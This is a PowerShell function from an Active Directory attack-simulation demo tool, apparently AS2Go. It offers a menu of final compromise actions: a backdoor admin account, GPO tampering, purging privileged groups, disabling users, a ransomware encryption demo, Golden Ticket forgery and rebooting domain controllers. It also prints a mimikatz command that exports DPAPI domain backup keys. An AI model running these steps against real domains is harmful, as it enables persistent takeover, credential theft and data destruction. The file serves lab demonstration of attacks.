<#
.SYNOPSIS
Offers domain persistence, disruption, and demonstration-closing actions.

.DESCRIPTION
Presents a repeatable menu of final AS2Go actions and invokes the selected workflow after its confirmation steps.
Options include creating an administrative backdoor user, modifying a selected GPO, removing privileged group
memberships, disabling users or resetting passwords, and encrypting files through the ransomware demonstration.
Other options export domain DPAPI backup keys, forge and inject a Golden Ticket, or restart configured victims.
Exit invokes the demo-closing workflow. Unattended mode selects the backdoor step followed by the reboot step.

.EXAMPLE
Invoke-Phase12DomainCompromise
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Available actions depend on initialized module settings, tools, modules, and current permissions.
The default menu sequence does not execute every listed action automatically.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Offers a privileged backdoor account, GPO changes, group membership removal, and user disabling or password resets.
Also offers file encryption, domain DPAPI backup-key export, and Golden Ticket creation and injection.
Runs the selected workflow, restarts configured victim machines, or closes the AS2Go demonstration.
#>
function Invoke-Phase12DomainCompromise {

    ################################################################################
    #####                                                                      ##### 
    #####    Phase 12 Domain Comprommise
    #####                                                                      #####
    ################################################################################

    $info = Measure-FunctionRuntime -Begin
 
    $nextAnswer = "B"

    $topicBackdoor = "Establish persistent domain access through a covert backdoor account"
    $topicGPT = "Weaponize Group Policy Template (GPT) files for domain-wide compromise"
    $topicPurge = "Purge all privileged group memberships to grant exclusive control to the backdoor account"
    $topicUserAccount = "Disable user accounts or enforce password resets (retain backdoor control)"
    $topicEncrypt = "Encrypt critical Domain Controller assets for strategic leverage"
    $topicMasterKey = "Extract the DPAPI master key for credential and secret recovery"
    $topicGoldenTicket = "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
    $topicReboot = "Trigger coordinated reboot across accessible Domain Controllers"
    $topicExit = "Exit AS2Go."

    Do {

        Write-AS2GoOutput -Type Header -Message "Select a Final Action"

        Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicBackdoor"
        Write-Host "   T " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicGPT"
        Write-Host "   P " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicPurge"
        Write-Host "   U " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicUserAccount"
        Write-Host "   E " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicEncrypt"
        Write-Host "   K " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicMasterKey"
        Write-Host "   G " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicGoldenTicket"
        Write-Host "   R " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicReboot"
        Write-Host "`n   X " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicExit"



        If ($UnAttended) {
            $answer = $nextAnswer
        }
        else {

            If(-not $Script:MoGPO){
                $topicGPT = $null
            }

            $title = "Domain Dominance & Persistence"
            $message = "Select the action to execute. Options with unmet requirements are hidden."
            $Options = @(
                [pscustomobject] @{
                    Label = "&Backdoor"
                    Help  = $topicBackdoor
                    Value = "B"
                },
                [pscustomobject] @{
                    Label = "GP&T"
                    Help  = $topicGPT
                    Value = "T"
                },
                [pscustomobject] @{
                    Label = "&Purge"
                    Help  = $topicPurge
                    Value = "P"
                },
                [pscustomobject] @{
                    Label = "&User Account"
                    Help  = $topicUserAccount
                    Value = "U"
                },
                [pscustomobject] @{
                    Label = "Master &Key"
                    Help  = $topicMasterKey
                    Value = "K"
                },
                [pscustomobject] @{
                    Label = "&Golden Ticket"
                    Help  = $topicGoldenTicket
                    Value = "G"
                },
                [pscustomobject] @{
                    Label = "&Encrypt"
                    Help  = $topicEncrypt
                    Value = "E"
                },
                [pscustomobject] @{
                    Label = "&Reboot"
                    Help  = $topicReboot
                    Value = "R"
                },
                [pscustomobject] @{
                    Label = "E&xit"
                    Help  = $topicExit
                    Value = "X"
                }
            )
            $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
        }

        switch ($answer) {

            "B" {
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type  Header -M "Create a backdoor account with elevated group memberships for persistence"

        
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $answer = Show-DecisionPrompt
                }
    
                If ($answer -eq $Script:Yes) {
                    New-BackDoorUser
                    #If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
                $nextAnswer = "R"
                $repeat = $Script:Yes 
            }
            "P" {
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type  Header -M "Purge all privileged group memberships"
                $answer = $Script:Yes
                
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
    
                If ($answer -eq $Script:Yes) {
                    Invoke-GroupManipulation
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
                $NextStep = "T"
                $repeat = $Script:Yes 
            }
            "T" {
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type  Header -M "Manipulate Group Policy Templates (GPT) files"
        
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $answer = Show-DecisionPrompt
                }
    
                If ($answer -eq $Script:Yes) {

                    $TargetGPO = Get-GPOLinkedOnDomain


                    $TargetGPO = Get-TargetGPO


                    
                    if ([string]::IsNullOrEmpty($TargetGPO)) {
                        Write-AS2GoOutput -Type CodeSnippet -Message "Domain Selection cancled by user"
                    }
                    else {
                        New-GPOManipulation -ID $TargetGPO.ID.Guid -name $TargetGPO.DisplayName -domainDNS $TargetGPO.DomainDNS -server $TargetGPO.Server
                    }
                }
                $nextAnswer = "U"
                $repeat = $Script:Yes  
            }
            "U" {
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type  Header -M "Disable user accounts or/and enforce password resets"
      
                $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
                $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
    
        
                Write-host "  ... will ignore your new backdoor user " -NoNewline
                Write-host $global:BDUser -ForegroundColor $Script:FGCHighLight -NoNewline
                Write-Host " - $Smily"
            
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $question = "Do you want to run these steps - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $Script:Yes
                }
    
                If ($answer -eq $Script:Yes) {
                    #$Script:ASSearchBase = Get-ASConfig -Setting "MySearchBase"
                    New-UserManipulation
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                } 
                $NextStep = "T"
                $repeat = $Script:Yes   
            }
            "G" {
                If (-not $SkipClearHost) { Clear-Host }

                Write-AS2GoOutput -Type  Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
                Write-AS2GoOutput -Type  Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
                Write-AS2GoOutput -Type  Bullet -M "Step 2: Forge Golden Ticket"
                Write-AS2GoOutput -Type  Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
    
                If ($UnAttended) {
                    $answer = $Script:No 
                }
                else {
                    $answer = Show-DecisionPrompt
                }
    
                If ($answer -eq $Script:Yes) {
                    Invoke-GoldenTicket
                } 
                $repeat = $Script:Yes  
            }
            "E" {
                #region  Step - ran ransomware attack? 
                #Pause
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type  Header -M "Encrypt critical Domain Controller assets for strategic leverage"
    
                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $question = "Do you want to run this attack - Y or N? Default "
                    #$answer = Get-Answer -question $question -defaultValue $Script:Yes
                    $answer = $Script:Yes 
                }

                If ($answer -eq $Script:Yes) {
                    #run functions
                    New-RansomwareAttack -BackupShare $Script:ASOfflineDITFile
                    If ($UnAttended) { Start-Sleep 2 } else { Pause }
                }
                #endregion  Step - ran ransomware attack?
                $repeat = $Script:Yes   
            }
            "K" {

                If (-not $SkipClearHost) { Clear-Host }

                Write-AS2GoOutput -Type  Header -M "Export DATA PROTECTION API master key"
                Write-AS2GoOutput -Type  Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
                Write-AS2GoOutput -Type CodeSnippet -Message "Command:"

                Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
                    -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
                Write-Host  ""

                If ($UnAttended) {
                    $answer = $Script:Yes 
                }
                else {
                    $answer = Show-DecisionPrompt
                }

                If ($answer -eq $Script:Yes) {
                    Export-DPAPIMasterKey
                }

                $repeat = $Script:Yes      
            }
            "R" {
                #Pause
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type  Header -M "Trigger coordinated reboot across accessible Domain Controllers"
                Restart-VictimMachines
                $repeat = $Script:Yes
            }
            "X" {
                Stop-AS2GoDemo -NextStepReboot $Script:No
                $repeat = $Script:No
                pause
            }

            default {
                Write-Host "out of scope"
                $repeat = $Script:Yes  
            }
        }

        If (-not $SkipClearHost) { Clear-Host }
  
    } Until ($repeat -eq $Script:No)

    Measure-FunctionRuntime -End -Details $info

}
